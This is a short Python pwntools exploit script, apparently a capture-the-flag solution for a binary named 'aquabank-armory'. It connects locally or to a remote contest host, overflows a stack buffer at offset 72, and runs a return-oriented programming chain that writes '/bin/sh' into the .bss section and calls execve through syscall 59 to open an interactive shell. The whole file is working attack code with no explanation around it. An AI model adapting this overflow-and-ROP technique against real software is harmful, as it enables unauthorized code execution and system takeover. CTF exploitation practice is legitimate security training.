#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF('./aquabank-armory', checksec = False)

pop_rax_ret = 0x00000000004214eb    # found with ROPgadget
OFFSET = 72                         # found with cyclic(200)
ret_gadget = 0x000000000040101a     

def conn():
    if args.LOCAL: 
        r = process(elf.path)
        if args.GDB:
            gdb.attach(r)
            pause()
    else: 
        r = remote('offsec.m0lecon.it',13554)
    return r

def main():
    p = conn()

    #ROP chain
    p.recvuntil(b'weapons:')
    payload = flat(
        b'A'*OFFSET,
        
        p64(ret_gadget),
        #step 1: write /bin/sh in .bss section
        p64(elf.sym.pop_rdi_ret),p64(0),
        p64(elf.sym.pop_rsi_ret),p64(elf.bss()),
        p64(elf.sym.pop_rdx_ret),p64(64),
        p64(elf.sym.read),

        #step 2: call execve() as syscall no.59
        p64(pop_rax_ret),p64(59),
        p64(elf.sym.pop_rdi_ret),p64(elf.bss()),
        p64(elf.sym.pop_rsi_ret),p64(0),
        p64(elf.sym.pop_rdx_ret),p64(0),
        p64(elf.sym.syscall_ret)
    )
    p.send(payload)
    p.send(b'/bin/sh\0')

    p.interactive()

if __name__ == "__main__":
    main()